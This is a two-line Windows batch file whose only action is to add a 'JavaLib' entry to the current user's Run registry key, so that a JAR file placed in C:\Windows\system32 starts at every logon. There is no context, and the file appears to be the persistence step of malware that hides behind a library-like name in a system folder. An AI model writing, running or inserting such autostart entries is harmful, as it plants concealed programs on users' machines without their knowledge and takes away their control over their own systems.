@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v JavaLib /t REG_SZ /d C:\Windows\system32\JavaLib.jar  
